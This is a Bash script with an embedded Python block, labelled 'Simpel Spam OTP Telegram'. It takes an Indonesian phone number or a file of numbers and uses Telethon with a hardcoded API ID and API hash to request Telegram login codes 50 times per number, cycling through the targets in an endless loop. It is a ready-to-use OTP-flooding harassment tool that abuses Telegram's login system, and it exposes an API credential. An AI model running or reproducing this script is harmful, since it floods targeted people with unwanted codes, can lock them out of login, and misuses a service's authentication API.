#!/bin/bash
clear
                                nala install python python3 -y
                                pip install telethon
                                pip install flask
FILE_NOMOR="$HOME/.number_otp"
API_ID=24835154
API_HASH="e7c35ab96f8d8f76513fd7a3ae242c3b"

# Warna ANSI
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
RESET='\033[0m'
e="echo -e "
m="\033[1;31m"
h="\033[1;32m"
k="\033[1;33m"
b="\033[1;34m"
bl="\033[1;36m"
p="\033[1;37m"
u="\033[1;35m"
pu="\033[1;30m"
c="\033[1;96m"
or="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
bld="\033[1;94m"
pwl="\033[1;95m"
blg="\033[1;97m"
lg="\033[1;90m"
bg_m="\033[41m"
bg_h="\033[42m"
bg_k="\033[43m"
bg_b="\033[44m"
bg_bl="\033[46m"
bg_p="\033[47m"
bg_u="\033[45m"
bg_pu="\033[40m"
bg_c="\033[106m"
bg_or="\033[101m"
bg_g="\033[102m"
bg_y="\033[103m"
bg_bld="\033[104m"
bg_pwl="\033[105m"
bg_lg="\033[100m"
res="\033[0m"

# Fungsi banner
banner_skill() {
   echo -e "
$m⠀ ⠀⠀⠀⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
$k⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉$h  Simpel Spam OTP Telegram⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⹹⣿⣿⣿⠃$k Developer$c Galirus Official⠀⠀⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇$or Version$k :$bld 4.0.0 beta...!⠀⠀⠀⠀⠀⠀
$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀
agar admin semangat boleh lah kali kali⠀⠀⠀⠀
sawer admin$k https://saweria.co/Galirus$res$h"
    local teks="=== Running Spamming Telegram (CLI) ==="
    for ((i=0; i<${#teks}; i++)); do
        printf "%c" "${teks:$i:1}"
        sleep 0.02
    done
    echo
}

normalize_nomor() {
    local input="$1"
    input=$(echo "$input" | tr -d ' \n')
    if [[ $input =~ ^\+62 ]]; then
        echo "$input"
    elif [[ $input =~ ^62 ]]; then
        echo "+$input"
    elif [[ $input =~ ^0 ]]; then
        echo "+62${input:1}"
    else
        echo "+62$input"
    fi
}

spam_otp() {
    local nomor="$1"
    local repeat="$2"
    local api_id="$3"
    local api_hash="$4"

    python3 - <<END
import asyncio
from telethon import TelegramClient
from telethon.errors import RPCError

API_ID = $api_id
API_HASH = "$api_hash"
NOMOR = "$nomor"
REPEAT = $repeat
DELAY = 10

async def start_telegram_client(phone, repeat):
    for i in range(repeat):
        print(f"\033[1;36mPengulangan ke-{i+1}, meminta OTP untuk nomor: {phone}\033[0m")
        client = TelegramClient(None, API_ID, API_HASH)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                await client.send_code_request(phone)
                print(f"\033[1;32mOTP telah diminta untuk pengulangan ke-{i+1}. Tunggu OTP diterima di nomor {phone}.\033[0m")
            print(f"\033[1;32mPermintaan OTP ke-{i+1} sukses untuk nomor: {phone}\033[0m")
        except RPCError as e:
            if 'ResendCodeRequest' in str(e) or 'FloodWait' in str(e) or 'PhoneCodeFlood' in str(e):
                print(f"\033[1;33mLimit pengiriman OTP tercapai untuk nomor {phone}. Berhenti mengirim.\033[0m")
                break
            else:
                print(f"\033[1;31mTerjadi kesalahan pada pengulangan ke-{i+1}: {str(e)}\033[0m")
                break
        finally:
            await client.disconnect()
        await asyncio.sleep(DELAY)

asyncio.run(start_telegram_client(NOMOR, REPEAT))
END
}

# === Tambahan Input Target Manual ===
read -p "Masukkan target nomor (kosongkan untuk pakai file): " target_input

if [[ -n "$target_input" ]]; then
    nomor=$(normalize_nomor "$target_input")
    nomor_list=("$nomor")
    total_nomor=1
else
    # Cek keberadaan file nomor
    if [[ ! -f "$FILE_NOMOR" ]]; then
        echo -e "${RED}File nomor tidak ditemukan: $FILE_NOMOR${RESET}"
        exit 1
    fi
    mapfile -t nomor_list < "$FILE_NOMOR"
    total_nomor=${#nomor_list[@]}
    if (( total_nomor == 0 )); then
        echo -e "${RED}File nomor kosong.${RESET}"
        exit 1
    fi
fi

current_index=0
repeat_per_nomor=50
while true; do
    clear
    banner_skill
    raw_nomor="${nomor_list[$current_index]}"
    nomor=$(normalize_nomor "$raw_nomor")
    echo -ne "\r${CYAN}[ Pengiriman ke nomor: $nomor ]${RESET}"
    spam_otp "$nomor" $repeat_per_nomor $API_ID "$API_HASH" &> /dev/null
    echo -ne "\r${GREEN}Selesai kirim OTP ke $nomor.${RESET}     \n"
    echo -e "${YELLOW}Tekan 'q' lalu ENTER untuk berhenti
atau tunggu 5 detik untuk lanjut ke nomor berikutnya...${RESET}"
    read -t 5 -r user_input
    if [[ "$user_input" == "q" ]]; then
        echo -e "${YELLOW}Script dihentikan oleh pengguna.${RESET}"
        exit 0
    fi
    current_index=$(((current_index + 1) % total_nomor))
done